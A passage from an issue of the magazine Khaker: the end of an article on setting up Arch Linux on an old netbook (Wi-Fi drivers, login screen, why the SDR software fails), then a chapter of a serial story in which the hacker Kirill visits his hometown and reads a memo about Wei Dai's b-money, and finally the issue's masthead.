Волевым решением я остановил этот процесс: скормил текущий конфиг ней‐
росети, добавил в промпт пожелания по дизайну и через минуту получил
отличный результат. Да, это не стопроцентно ручная работа, но мы же
не выращиваем сахарный тростник, чтобы испечь торт на день рождения,
верно?


ГЛАВА ПЯТАЯ. БИТВА ЗА WI-FI

Дальше начались приключения с сетью. Беспроводной чип BCM4313 имеет
определенную славу. С дефолтными драйверами из репозитория Arch он еле
завелся (для начала даже пришлось убрать спецсимвол из пароля точки дос‐
тупа). Какое‑то время все работало, но после установки NetworkManager сеть
начала отваливаться. NM жестко конфликтовал с iwd. Я оставил iwd в качес‐
тве бэкенда, но логи говорили, что соединение падает на этапе хендшейка.
  BCM4313 славится своей капризностью, и для адекватной работы ему нуж‐
ны проприетарные драйверы. Единственным рабочим решением оказалась
установка пакета dkms:


sudo pacman -Syu linux-headers broadcom-wl-dkms

После ребута команда nmcli  device  wifi  connect  <SSID> подхватила
подключение (и даже пароль, заданный на ранних этапах).


ГЛАВА ШЕСТАЯ. ФИНАЛЬНЫЕ ШТРИХИ

Система работала, но оставалось чувство недоделанности. Не хватало эсте‐
тики при входе и выходе. Проблема решилась установкой tuigreet (консоль‐
ный TUI-экран входа) и wlogout (графическое меню выхода/перезагрузки).
Настраивается все элементарно по их README.md . Единственное — пришлось
немного подкрутить шрифты в style.css для wlogout, так как дефолтные эле‐
менты были слишком огромными для 10,1-дюймового экрана.
  Мой стартовый пак для старичка :
 • Telegram Desktop (на удивление сносно работает);
 • epr — отличная TUI-читалка для электронных книг;
 • ShellGPT — консольный клиент, который я подключил к локальной модели
   через Ollama, крутящейся на моем основном мощном хосте;
 • qutebrowser — звезда этой сборки.





                            Desktop screen

Чтобы в будущем не повторять этот путь самурая после возможных неудачных
экспериментов, я забэкапил все dot-файлы с помощью stow и залил в свой
локальный GitLab. А директорию /etc сохранил на внешний диск через borg .


ЧТО НЕ ПОЛУЧИЛОСЬ

Как я ни старался, мне не удалось заставить нормально работать SDR-при‐
емник через gqrx (программа постоянно падала с segfault). Изначально я
грешил на интерфейс USB 2.0, думая, что он не справляется с потоком дан‐
ных от донгла. Но базовая математика расставила все по местам. Стандар‐
тный RTL-SDR на частоте 2,4 MSPS генерирует поток 8-битных I/Q-семплов
объемом всего около 4,8 Мбайт/с. Для шины USB 2.0 с ее практическими 35–
40 Мбайт/с это пустяки.
   Настоящим  «бутылочным  горлышком»   оказался   процессор.  Atom
N455 с его  in-order-архитектурой и слабым FPU  просто  захлебывался
в потоке вычислений с плавающей точкой. Ему нужно было в реальном вре‐
мени применять FIR-фильтры, делать децимацию, считать быстрое преобра‐
зование Фурье (FFT) для отрисовки водопада и демодулировать сигнал.
Железо не успевало перемалывать математику, буферы переполнялись,
и gqrx закономерно умирал. Возможно, консольные утилиты вроде rtl_fm
(без отрисовки GUI и спектра) старичок бы и потянул, но полноценный SDR-
комбайн оказался ему не по зубам. © X
GEEK





Осень наступила неожиданно: еще вчера солнце задер‐
живалось в окнах до самого вечера, а сегодня небо затянули
серые облака и город будто пропитался насквозь запахом
мокрых листьев. Кирилл уже почти собрал в рюкзак все
самое необходимое: осталось только положить зубную щет‐
ку и ноутбук.


   Последние две недели он отработал в «Экране» практически безвылазно,
дав возможность Серёге немного отдохнуть. Теперь тот вернулся в строй, и,
соблюдая предварительную договоренность, в отпуск решил отправиться уже
сам Кирилл. Нужно съездить в Подгорск к маме, которую он не видел уже
больше полугода. Маша тоже собралась к своим родителям в Краснодар,
потому эти пару недель они решили провести порознь. «Москвич» он понача‐
лу хотел загнать в гараж и привычно добраться до места назначения поездом,
но потом вдруг подумал, что поездка за рулем добавит ему полезного
водительского опыта, да и вообще может превратиться в увлекательное
путешествие, и все‑таки решился.
   Прежде чем отключить ноут от сети, он на всякий случай проверил почту.
В ящик упало одно‑единственное письмо, подписанное iV1rus, и Кирилл,
не раздумывая, открыл послание.
   «Привет, Кикс! — писал Иван. — Тут один прикольный сайт только что
появился, хотел там зарегистрироваться, а рега закрыта. Как думаешь, можно
его взломать?»
  Из чистого любопытства Киря прошел по приложенной к письму ссылке.
Обычная скучная страничка на сине‑белом фоне без единой картинки, в цен‐
тре — лаконичная надпись: «Добро пожаловать в закрытый справочник сту‐
дентов и выпускников элитных вузов России. С помощью этого сайта вы
можете узнать больше о старых друзьях и найти новых, отыскать информацию
о тех, с кем вы учитесь или учились, оставить данные для друзей, чтобы они
могли связаться с вами».





«Фигня какая‑то, — подумал Кирилл. — На кой выпускникам вузов, да еще
и элитных, сдался закрытый справочник? Напрочь лишенный смысла мертво‐
рожденный проект… Ваня определенно решил залезть туда с одной‑единс‐
твенной целью — познакомиться с какой‑нибудь смазливой студенточкой».
   Щелкнув мышью в окошке почтового клиента, он набрал ответ:
   «Вано, не майся дурью, а? Если тебе так приперло зарегаться в каком‑то
дурацком студенческом каталоге, поступи в институт, мозгов у тебя хватит.
Пользы от этого намного больше будет, я тебе гарантирую».
   Отправив эту ценную рекомендацию адресату, Кирилл с чувством выпол‐
ненного долга захлопнул крышку ноутбука.





— Уезжаешь куда‑то, Кирюша?
   Сосед был одет уже по‑осеннему, в теплое старомодное пальто и вель‐
ветовую кепку с опущенными ушами.
 — Здравствуйте, Борис Семенович, — поприветствовал его Кирилл, зак‐
рывая квартиру. — Да, решил в родной город съездить, вернусь через пару
недель.
 — Родной город — это правильно, о корнях нельзя забывать. А загляни‑ка
ко мне на минуточку, — с заговорщицким видом подмигнул ему Криптодед.
   Кирилл шагнул в уже знакомую прихожую и замер в ожидании.
 — Как там все прошло‑то? — поинтересовался Борис Семенович, с крях‐
тением снимая ботинки. — Не обидел тебя деньгами Аркадий?
 — Нет, еще и заказов подкинул, так что на ближайшие полгода мы работой
точно обеспечены. Спасибо вам большое.
 — А я вот хочу тебе кое‑чего дать почитать в дорогу, — доверительно
сообщил Борис Семенович, прошаркал в комнату и вернулся с тонкой стоп‐
кой принтерных  распечаток в прозрачной  полиэтиленовой обложке. —
Это аналитическая записка, специалисты с моей бывшей работы подготови‐
ли. Ничего секретного, но, так сказать, бумаги для служебного пользования,
поэтому не раскидывай их где попало. Мне этот опус по старой дружбе дали,
чтобы узнать мое мнение, потому как оно вроде бы по моей части. Я пог‐
лядел, да понял, что сильно отстал от жизни. Тебе, кстати, имя Вэй Дай ни о
чем не говорит?
 — Нет… — растерянно пожал плечами Кирилл. — Какой‑то китаец?
 — Американец, — сосед протянул ему бумаги, — китайского происхожде‐
ния. Вот, изучи на досуге, потом, как вернешься, расскажешь мне, что дума‐
ешь по этому поводу. Ты парень толковый, разберешься, небось, что там
к чему.
 — Хорошо, обязательно посмотрю, — заверил соседа Кирилл, убирая
папку в рюкзак.





Бросив поклажу в багажник, он открыл капот, проверил уровень масла
и охлаждающей жидкости. Путь предстоял неблизкий, но старенький «мос‐
квич» должен был выдержать это испытание.
 — Привет!
   Маша стояла посреди двора, придерживая рукой перекинутую через плечо
объемную спортивную сумку. На лице — самый минимум косметики, вьющи‐
еся темные волосы собраны в тугой хвост.
 — Ты чего тут делаешь? — слегка опешил Кирилл. — Ты ж вроде к родите‐
лям собралась…
 — Да вот подумала и решила с тобой поехать. Что‑то боязно тебя одного
отпускать, вдруг там еще какая‑нибудь бывшая коллега или одноклассница
отыщется… Заодно и с мамой твоей познакомлюсь. А потом к моим предкам
можно съездить, представлю им тебя, так сказать, официально.
 — Маш, так добираться далеко…
 — А я сосиски в тесте в дорогу напекла. И термос с кофе приготовила!
   Кирилл посмотрел на подругу долгим оценивающим взглядом: настроена
она была решительно. Оставалось только смириться с неизбежным.
 — Залезай, — вздохнул он, открывая пассажирскую дверь.

                       ***

На привокзальной площади напротив автобусной остановки высился потем‐
невший от времени памятник Ленину. Кирилл осторожно объехал бескрай‐
нюю лужу, в которой плескалась парочка взъерошенных голубей, и свернул
на улицу Мира — до дома оставалось уже совсем немного.
   Дверь распахнулась почти сразу, будто их с нетерпением ждали. Мама,
в домашнем свитере и с чуть растрепавшимися волосами, сначала вни‐
мательно посмотрела на сына, словно проверяя, не слишком ли сильно он
изменился за время разлуки, а потом перевела взгляд на Машу и вдруг улыб‐
нулась — спокойно, без тени неловкости или удивления.
 — Проходите, чего в дверях стоять, — сказала она так, будто Маша была
здесь не в первый раз. — Устали с дороги?
   Кирилл поймал себя на том, что ожидал каких‑то расспросов, неловкой
паузы, но ничего этого не случилось. Мама уже забрала у Маши куртку,
повесила ее в шкаф и отправилась ставить чайник, по пути бросив через пле‐
чо что‑то про пирог, который как раз вовремя подоспел. Маша, слегка рас‐
терянная, предложила помочь — и это предложение было принято как само
собой разумеющееся.
   Очень скоро кухня наполнилась движением и негромкими голосами. Мама
и Маша  вдвоем  суетились  у  стола,  что‑то  обсуждали  и  смеялись
над какими‑то пустяками. Со стороны могло показаться, будто они знакомы
целую вечность и между ними давно установился этот простой и редкий ритм
бытового согласия. Кирилл сидел в комнате на диване, прислушиваясь к про‐
исходящему на кухне со странным, почти недоверчивым чувством. «Уди‐
вительно, что все происходит именно так, — думал он, — без напряжения,
будто жизнь сама позволила событиям течь естественно, как складываются
только самые важные вещи».





После завтрака он застал обеих в гостиной за просмотром семейного фото‐
альбома. Кирилл всегда воспринимал это мероприятие как своего рода раз‐
новидность изощренной пытки, но Маша, похоже, разглядывала старые чер‐
но‑белые снимки с живым любопытством.
 — А это ты? — спросила она, задержав взгляд на карточке с худым маль‐
чишкой в нелепой панаме.
   Кирилл вздохнул, но мама опередила его, с явным удовольствием пус‐
тившись в объяснения. В ее голосе не было привычной для таких рассказов
ностальгии — скорее, спокойная радость от того, что прошлое кому‑то дей‐
ствительно интересно.
   Когда Маша вышла на балкон ответить на телефонный звонок, в комнате
на несколько секунд стало непривычно пусто. Мама закрыла альбом, аккурат‐
но положив ладонь на обложку, и посмотрела на Кирилла тем самым взгля‐
дом, который он хорошо знал с детства. Не строгим и не ласковым —
выжидающим.
 — Хорошая девочка, — сказала наконец она. — Хозяйственная. И умнень‐
кая.
   Кирилл неопределенно хмыкнул и сделал вид, что его больше заботит
кружка с давно остывшим чаем.
 — Сейчас такие нечасто  встречаются, — продолжила мама, словно
не замечая его реакции. — По хозяйству мне помогла, тобой интересуется.
Это, знаешь, многое значит.
  Она говорила без нажима, но Кирилл слишком хорошо знал эту инто‐
нацию. За ней всегда шел следующий шаг — аккуратный, будто бы логичный
сам по себе, но неизбежный, как гром после сверкнувшей в грозовых тучах
молнии.
 — Ты бы держался за нее, — добавила она, — сколько уже можно по дев‐
кам бегать?
 — Мам, я никуда и ни за кем не бегаю, — начал он, стараясь говорить ров‐
но, — и мы, между прочим, вообще‑то не так давно встречаемся.
 — Так я и не тороплю, — тут же отозвалась она. — Просто рассуждаю. Ког‐
да люди подходят друг другу, это же видно сразу. А у вас, знаешь… чувству‐
ется.
   Кирилл поймал себя на мысли, что почти те же слова, пусть и в другой,
более осторожной форме, Маша произнесла еще в дороге. Тогда это звучало
мягко, как будто она боялась спугнуть саму идею, — девушка сказала, что раз
им вместе очень легко, значит, они идеально подходят друг другу. И это чувс‐
твуется. «Спелись», — с легким раздражением подумал Кирилл. Его зацепило
даже не само содержание разговора, а это странное совпадение интонаций,
будто они действительно заранее договорились меж собой и теперь разыг‐
рывают давно продуманную и отрепетированную сцену.
  С балкона донесся Машин голос — она смеялась, что‑то коротко отвечая
собеседнику. Кирилл машинально прислушался и вдруг почувствовал, что
раздражение куда‑то исчезло, сменившись тревогой. Слишком быстро все
стало «само собой разумеющимся», слишком легко. Он отставил в сторону
опустевшую кружку и поднялся на ноги.
 — Пойду прогуляюсь.
 — Куда? Холодно же…
 — Я скоро вернусь, мам.
   Мама посмотрела на него внимательно, но спорить не стала. Только кив‐
нула, соглашаясь:
 — Конечно, иди. Мы с Машей пока на обед чего‑нибудь приготовим,
а вечером тетю Таню в гости позовем, ты не против?





Над землей гулял стылый ветер, швыряя под ноги снежную крупу, которая
еще не успела укрыть землю. Кирилл поднял воротник  куртки, спасаясь
от пронизывающего холода. Свернув с дорожки, он продрался сквозь обле‐
тевшие кусты, обогнул низкую ограду и огляделся по сторонам. Старый
тополь, наклонившись к самой земле, почти касался ветками бурого пок‐
рывала из опавших листьев, кособокая деревянная скамейка еще держалась,
хотя он думал, что она уже давно развалилась на куски и канула в небытие.
Здесь все было по‑прежнему.
 — Привет, пап, — тихо сказал он.
   Узкая бетонная стела блестела серебристым инеем, в замерзшем цвет‐
нике лежала  парочка потемневших  жухлых  гвоздик. Мама  давно здесь
не была, сначала было некогда, потом не позволяло здоровье. «Надо будет
по весне обновить памятник, — подумал Кирилл, — подправить надпись
да цветы посадить нормальные». Он постоял молча, слушая, как ветер шелес‐
тит в ветках тополя, и поймал себя на том, что слова, которые хотелось бы
сказать, никак не складываются в фразы. Он вспомнил, что раньше отец
казался ему по‑настоящему живым именно здесь — не на старой чер‐
но‑белой фотографии, где он был еще беззаботен и молод, а в обрывках вос‐
поминаний, являющихся, когда Кирилл приходил с матерью на это самое
место. Подумалось, что по дороге сюда он мысленно собирался рассказать
отцу про Машу, про дом, но сейчас остановился на полуслове, не зная, зачем
и для чего продолжать.
   Снова подул ветер. Кирилл посмотрел на часы: скоро начнет темнеть,
а ему нужно еще пройти по центральной аллее на другой конец кладбища,
туда, где оно упиралось в высокий берег Подгорки.
  Он отыскал нужное место не сразу, но, заприметив массивную каменную
плиту издалека, шел, зацепившись за нее взглядом, как корабль на далекий
свет маяка. Санчо смотрел на него с черного гранита как живой, чуть улы‐
баясь уголками губ, и эта улыбка была знакомой до боли, до слез. В горле
застрял горький ком, Кирилл замедлил шаг, прислушиваясь к тишине вокруг,
к шороху листьев под ногами, к ветру, который вдруг стих в одно мгновение.
Он приблизился и коснулся плиты рукой, почувствовав, как холод камня оку‐
тывает пальцы.
 — Такие дела, дружище, — произнес Кирилл.
  Он почти ожидал, что Санчо ответит, но глаза на граните лишь молча улы‐
бались, и эта тишина была тяжелее любых слов. Ветер снова поднялся, раз‐
метав белое крошево по цветнику. Кирилл оперся лбом о гладкую повер‐
хность стелы, закрыл глаза и замер, чувствуя, что мир тоже замер вокруг.
  В приоткрытые ворота кладбища он вышел, когда на сером небе кто‑то
выкрутил яркость на минимум, а над землей разлился далекий колокольный
перезвон, смешиваясь с хриплым вороньим граем. Кафе попалось на пути
очень кстати: Кирилл замерз настолько, что уже почти не чувствовал ног. Взяв
американо, он удалился за столик в самом дальнем углу, погрел о глянцевые
бока кружки озябшие руки и, покопавшись в рюкзаке, вытащил оттуда проз‐
рачную папку с отпечатанными на принтере бумажными листами.





Документ оказался крайне любопытным. Аналитики писали, что в 1998 году
выпускник Вашингтонского университета, талантливый молодой математик
по имени Вэй Дай придумал уникальную технологию. До этого Дай стал соз‐
дателем известной шифро‑библиотеки с открытым исходным кодом CryptoPP,
а еще он первым обнаружил критическую уязвимость в криптографическом
протоколе TLS, сделав возможным создание нашумевшего эксплоита BEAST,
который превратился в грозное оружие хакеров. Потом Дай успел поработать
в группе исследователей криптографических алгоритмов на корпорацию
«Майкрософт» в Редмонде и даже зарегистрировал несколько патентов
в сфере криптографии. Однако талантливый парень быстро разочаровался
в карьере офисного планктона и ушел в свободное плавание. А еще раньше
он  трудился программистом в одном из независимых подразделений…
Да ладно…
   Отхлебнув остывающий кофе, Кирилл с иронией подумал о том, что «Тер‐
ра» в буквальном смысле преследует его по пятам: куда бы он ни пытался
скрыться, призрак этой компании, словно тень, неотступно держится рядом.
Покачав головой, он снова  углубился в чтение, стараясь не пропустить
ни слова.
  На основе разработанных им криптографических алгоритмов в том же
девяносто восьмом году Дай придумал интересную децентрализованную
систему. Источником вдохновения для него, по его собственным словам, ста‐
ла идеология криптоанархизма, которой он проникся, начитавшись текстов
писателя и инженера Тимоти Мэя. Криптоанархисты предрекали создание
общества, свободного от какого‑либо насилия, — прежде всего потому, что
само по себе насилие невозможно, если членов социума нельзя иден‐
тифицировать благодаря повсеместному использованию шифрования.
   Однако любое общество нуждается во взаимных услугах, а следовательно,
в инструментах для финансовых расчетов и заключения контрактов. Традици‐
онные финансовые институты основаны на деньгах, эмитируемых либо самим
государством, либо  тесно связанными с ним  банковскими структурами,
и полностью контролируются правительством. Органы власти легко могут
заблокировать любому неугодному человеку доступ к банковским счетам
и картам, а также в состоянии заморозить или изъять его накопления, после
чего гражданин фактически останется без средств к существованию. В про‐
тивовес этому использующая криптографию анонимная и децентрализован‐
ная  система может  гарантировать, что пользователь не  потеряет  воз‐
можность распоряжаться своими средствами ни при каких обстоятельствах.
  В 1998 году Дай опубликовал в интернете документ, где описал два про‐
токола для создания децентрализованной цифровой валюты, которую он наз‐
вал А-Money. Согласно задумке изобретателя, каждый участник такой сис‐
темы использовал уникальный цифровой псевдоним, а все его действия фик‐
сировались в коллективном журнале, который могли проверять другие поль‐
зователи. Чтобы финансовые операции никто не мог подделать или изменить
задним числом, они записывались в журнал с помощью зашифрованных
открытым  ключом  блоков,  объединяющихся  в  непрерывные  цепочки.
В документе они так и назывались — «цепь блоков», на языке оригинала —
«блок чейн».
   Транзакции подписывались цифровыми подписями и передавались дру‐
гим участникам, а база данных обновлялась у всех одновременно. Любые
контракты заключались через широковещательные сообщения, и, если кто‑то
нарушал  условия,  подключался  арбитр.  Разумеется,  поддержка  такого
количества цифровых журналов и большого числа транзакций требовала
мощных вычислительных ресурсов, и Дай решил позаимствовать их у самих
участников системы. Он предоставил им возможность зарабатывать деньги,
выполняя определенную «вычислительную работу» для поддержки работос‐
пособности сети. Результат этой работы также могли проверить другие учас‐
тники, располагающие открытыми ключами. Притом основным критерием
оценки Дай посчитал объем потраченных вычислительных ресурсов. К при‐
меру, если задача может быть решена на компьютере за сто часов, а для
покупки такого же вычислительного ресурса на открытом рынке потребуется
три доллара, то именно такая сумма в денежном эквиваленте и будет зачис‐
лена на счет решившего эту задачу  участника системы, а информация
об этом зафиксируется в локальных базах данных всех остальных пользовате‐
лей.
   Платежная система Дая предусматривала еще и возможность заключения
участниками цифровых контрактов. В таком контракте заранее оговаривались
дата выполнения работы и ее стоимость, а также максимальные суммы воз‐
мещения для каждой из сторон в случае неисполнения другой стороной своих
обязательств. Все это заверялось независимым арбитром. Средства учас‐
тников сделки депонировались на специальном «контрактном счете» и спи‐
сывались только в том случае, если условия договора исполнялись обеими
сторонами. Если что‑то шло не так, контракт считался недействительным
и все выполненные ранее транзакции откатывались, а информация об этом
фиксировалась в базах данных.
   Читая бумаги, Кирилл сразу отметил главный недостаток предложенной
Вэй Даем системы: поскольку точная копия базы хранится у каждого участни‐
ка локально, скорость ее обновления будет крайне невысокой и со временем
станет снижаться, а огромная база сожрет все доступное дисковое прос‐
транство на компьютере. Кроме того, пользователям понадобится постоян‐
ное подключение к интернету для своевременной  загрузки непрерывно
обновляющихся данных, которые создадут при этом чудовищный трафик. Дай,
видимо, тоже прекрасно осознавал эти минусы и сам же предложил альтер‐
нативу: более совершенную платежную систему под названием B-Money.
   Этот вариант отличался от исходного только тем, что для хранения базы
данных о транзакциях использовались компьютеры не всех участников сети,
а лишь некоторых, — машины таких «хранителей» Дай условно назвал «сер‐
верами». При этом участники каждой транзакции должны в обязательном
порядке убедиться, что широковещательное сообщение о передаче денег
было получено и успешно обработано случайно выбранным подмножеством
серверов. Актуальность баз транзакций, по задумке Дая, должна поддержи‐
ваться их постоянной синхронизацией.
   Однако тут возникает проблема доверия серверам со стороны простых
участников системы. Вэй Дай решил ее следующим образом: каждый сервер
должен депонировать определенную сумму цифровых денег на специальном
счете. Если какой‑либо из серверов окажется замеченным в тех или иных
мошеннических действиях, на него налагается штраф, который списывается
с этого депозита. А участнику, заметившему мошенничество, с того же счета
начисляется вознаграждение. Хранящаяся на каждом из серверов база тран‐
закций должна быть публичной, чтобы любой участник системы в любой
момент мог проверить, совпадает ли локальная информация о состоянии его
счета с записью в базе. Кроме того, каждый участник сети по желанию дол‐
жен иметь возможность убедиться, что общая сумма денег на всех счетах
пользователей не превышает общий объем цифровой валюты, которой опе‐
рирует платежная система. Это исключает возможность бесконтрольного
наращивания денежной массы даже в случае сговора владельцев всех сер‐
веров на планете…
   «Примечательно, — писали аналитики, — но о личной жизни Вэй Дая, его
занятиях и увлечениях до сих пор не известно практически ничего. Он ведет
крайне скрытный образ жизни, не дает интервью, не выступает на конферен‐
циях и не общается с прессой. Даже имеющиеся в сети фотографии Дая вну‐
шают сомнения в своей подлинности: сам он утверждает, будто все приписы‐
ваемые  ему  портреты —  снимки  совершенно  других  людей,  многие
из которых являются его полными тезками».
   Кирилл дочитал документ, закрыл папку и отложил ее в сторону. Последняя
страница  отчета  гласила,  что в 1998 году бытовые  компьютеры были
еще слишком слабыми,  чтобы потянуть столь сложные вычислительные
задачи, и идею основанной на криптографии платежной системы пришлось
отложить.
   Отложить, но не забросить. Авторы документа уверяли: недавно Вэй Дай
вместе с другим талантливым американским математиком китайского про‐
исхождения внезапно решил вытащить свое изобретение из чулана, сдуть
с него пыль, чуть усовершенствовать и вдохнуть в него вторую жизнь. Благо
современные  персоналки уже  вполне  способны  осилить  необходимые
для поддержания подобной сети сложные криптографические расчеты.
   Аналитики посчитали, что на перезапуск платежной системы у Вэй Дая
и его партнера уйдет где‑то полтора‑два года. При этом оба хакера‑изоб‐
ретателя по‑прежнему стараются держаться в тени и не показываться на пуб‐
лике, а вместо собственных имен они даже придумали коллективный псев‐
доним. Кирилл не запомнил, какой именно, — что‑то японское. Не то Тотоша
Накопоте, не то Святоша Накомоде.
   «Интересно, — подумал он, допивая остывший кофе, — если парням удас‐
тся реализовать задуманное, это хорошенько встряхнет весь мировой финан‐
совый ландшафт. По крайней мере, хакеры уж точно с удовольствием возьмут
на вооружение удобную и анонимную цифровую валюту».
  Он представил себе этих двух математиков, сидящих где‑нибудь за экра‐
ном компьютера. Ни лиц, ни биографий — только код, расчеты и общая идея,
слишком глобальная, чтобы люди могли осознать ее значимость. В этом было
что‑то одновременно пугающее и притягательное.
   Кирилл  поднялся,  накинул  куртку  и  бросил  взгляд  на  папку,  все
еще лежащую перед ним на столе. Мысль о том, что кто‑то способен перепи‐
сать правила игры, не выходя из тени, неожиданно показалась ему близкой
и почти личной. Он усмехнулся: мир, похоже, снова собирался измениться —
и, как обычно, двигали эти перемены вовсе не те, кого показывают по телеви‐
зору в вечерних новостях. © X
   №4 (325)

          Андрей Письменный        Валентин Холмогоров         Илья Русанен
              Главный редактор           Ведущий редактор                  Разработка
             pismenny@glc.ru            valentin@holmogorov.ru            rusanen@glc.ru
                          Евгения Шарипова             yambuto
                           Литературный редактор           Бильд‑редактор
                                                    yambuto@gmail.com


                          MEGANEWS

                                     Мария Нефёдова
                                            nefedova@glc.ru


                    КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                               Марк Бруцкий‑Стемпковский,
                                 Олег Афонин, Nik Zerof, ret0x2A


                             РЕКЛАМА

                                            Анна Яковлева
                                        Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                          Вопросы о подписке:          ​Вопросы о материалах:
                                lapina@glc.ru                  support@glc.ru​





Учредитель: ИП Яковлева Анна Вадимовна ИНН 503806735948 ОГРН/ОГРНИП 320508100264021. Адрес: 141271, Россия, Московская область,
Пушкино, мкр Софрино-1, дом 28, квартира 58. Телефон: +7(980)4591655. Зарегистрировано Федеральной службой по надзору в сфере связи,
информационных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ЭЛ № ФС 77 — 73894 от 12.10.2018 года. Мнение
редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставляются как информация к размышлению. Лица,
использующие данную информацию в противозаконных целях, могут быть привлечены к ответственности. Редакция не несет ответственности
за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование редакционных материалов
журнала обращайтесь по адресу: content@glc.ru. © Журнал «Хакер», РФ, 2026